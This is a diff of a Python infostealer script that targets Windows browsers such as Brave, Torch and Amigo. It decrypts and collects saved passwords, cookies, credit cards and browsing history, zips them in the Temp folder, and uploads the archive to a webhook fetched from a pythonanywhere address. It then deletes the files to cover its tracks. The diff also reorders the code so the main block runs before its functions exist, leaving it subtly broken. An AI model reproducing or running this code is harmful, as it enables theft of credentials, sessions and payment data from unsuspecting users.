@@ -3,12 +3,9 @@ from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from datetime import datetime
 import base64
-
 hook = base64.b64decode(requests.get("https://mehmetaliii.pythonanywhere.com/webzuhurt").text).decode()
-
 appdata = os.getenv('LOCALAPPDATA')
 user = os.path.expanduser("~")
-
 browsers = {
     'amigo': appdata + '\\Amigo\\User Data',
     'torch': appdata + '\\Torch\\User Data',
@@ -27,7 +24,28 @@ browsers = {
     'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
     'iridium': appdata + '\\Iridium\\User Data',
 }
-
+if "__main__" == '__main__':
+    available_browsers = installed_browsers()
+    for browser in available_browsers:
+        browser_path = browsers[browser]
+        master_key = get_master_key(browser_path)
+        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
+        save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
+        save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
+        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
+        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
+        shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')    
+    try:
+     os.remove(user+'\\AppData\\Local\\Temp\\Browser')
+    except:
+        pass
+    with open(user+'\\AppData\\Local\\Temp\\Browser.zip', "rb") as f:
+     files = {"Browser.zip": (user+'\\AppData\\Local\\Temp\\Browser.zip', f)}
+     r = requests.post(hook, files=files)
+     try:
+         os.remove(user+"\\AppData\\Local\\Temp\\Browser.zip")
+     except:
+         pass
 
 def get_master_key(path: str):
     if not os.path.exists(path):
@@ -45,7 +63,6 @@ def get_master_key(path: str):
     master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
     return master_key
 
-
 def decrypt_password(buff: bytes, master_key: bytes) -> str:
     iv = buff[3:15]
     payload = buff[15:]
@@ -54,7 +71,6 @@ def decrypt_password(buff: bytes, master_key: bytes) -> str:
     decrypted_pass = decrypted_pass[:-16].decode()
 
     return decrypted_pass
-
 
 def save_results(browser_name, data_type, content):
     if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
@@ -85,7 +101,6 @@ def get_login_data(path: str, profile: str, master_key):
     os.remove(user+'\\AppData\\Local\\Temp\\login_db')
     return result
 
-
 def get_credit_cards(path: str, profile: str, master_key):
     cards_db = f'{path}\\{profile}\\Web Data'
     if not os.path.exists(cards_db):
@@ -113,7 +128,6 @@ def get_credit_cards(path: str, profile: str, master_key):
     conn.close()
     os.remove(user+'\\AppData\\Local\\Temp\\cards_db')
     return result
-
 
 def get_cookies(path: str, profile: str, master_key):
     cookie_db = f'{path}\\{profile}\\Network\\Cookies'
@@ -144,7 +158,6 @@ def get_cookies(path: str, profile: str, master_key):
     os.remove(user+'\\AppData\\Local\\Temp\\cookie_db')
     return result
 
-
 def get_web_history(path: str, profile: str):
     web_history_db = f'{path}\\{profile}\\History'
     result = ""
@@ -168,7 +181,6 @@ def get_web_history(path: str, profile: str):
     os.remove(user+'\\AppData\\Local\\Temp\\web_history_db')
     return result
 
-
 def get_downloads(path: str, profile: str):
     downloads_db = f'{path}\\{profile}\\History'
     if not os.path.exists(downloads_db):
@@ -190,40 +202,9 @@ def get_downloads(path: str, profile: str):
     conn.close()
     os.remove(user+'\\AppData\\Local\\Temp\\downloads_db')
 
-
-def installed_browsers():
-    results = []
-    for browser, path in browsers.items():
-        if os.path.exists(path):
-            results.append(browser)
-    return results
-
-
-if "__main__" == '__main__':
-    available_browsers = installed_browsers()
-
-    for browser in available_browsers:
-        browser_path = browsers[browser]
-        master_key = get_master_key(browser_path)
-
-        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
-
-        save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
-
-        save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
-
-        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
-
-        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
-        shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')    
-    try:
-     os.remove(user+'\\AppData\\Local\\Temp\\Browser')
-    except:
-        pass
-    with open(user+'\\AppData\\Local\\Temp\\Browser.zip', "rb") as f:
-     files = {"Browser.zip": (user+'\\AppData\\Local\\Temp\\Browser.zip', f)}
-     r = requests.post(hook, files=files)
-     try:
-         os.remove(user+"\\AppData\\Local\\Temp\\Browser.zip")
-     except:
-         pass
+# def installed_browsers():
+#     results = []
+#     for browser, path in browsers.items():
+#         if os.path.exists(path):
+#             results.append(browser)
+#     return results
